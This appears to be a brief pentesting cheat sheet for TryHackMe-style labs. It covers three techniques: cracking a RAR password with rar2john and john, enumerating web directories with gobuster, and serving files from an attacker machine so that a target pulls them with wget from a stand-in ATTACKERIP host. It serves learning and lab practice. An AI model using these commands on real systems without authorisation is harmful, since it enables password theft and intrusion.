<h1 align="center">RED BOOK</h1>
<h2 align="center"> Short examples for pentesting/hacking</h2>
<h3 align="center"> Tryhackme and other sources</h3>

<table>
<tr>
<td align="left">
<strong>RAR2JOHN</strong><br>
Brute force RAR file.<br>
rar2john [rar file] > [output file] <br>
First, extract the hash (password hash) from a RAR file:<br>
/opt/john/rar2john rarfile.rar > rar_hash.txt<br>
Brute force file with rar hash:<br>
john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt<br>
Unpack password protected rar file and enter password found.<br>
unrar rarfile.rar
</td>
</tr>
  <tr>
    <td align="left">
      <strong>GOBUSTER CRAWLER BRUTE FORCE SEARCH WEBPAGES</strong><br>
      Using wordlist, search for directories on webserver to detect what pages webserver have.<br>
      gobuster -u http://WEBPAGE -w WORDLIST.txt dir<br>
      -u is used to state the website we're scanning<br>
      -w takes a list of words to iterate through to find hidden pages<br>
      -dir search for directories
    </td>
  </tr>
  <tr>
    <td align="left">
      <strong>TRANSFER FILES USING HTTP</strong><br>
Start http server with Python (Win) and download files on target with wget request.<br>
On attacker (win): <br>
python3 -m http.server 1234 c:/testdir <br>            
-1234 is port where http server will listen, and in last part is directory for http server (not required)<br>
On target in CMD (win/linux/any):<br>
wget http://ATTACKERIP:1234/SOMEFILEINROOTDIR
    </td>
  </tr>
</table>

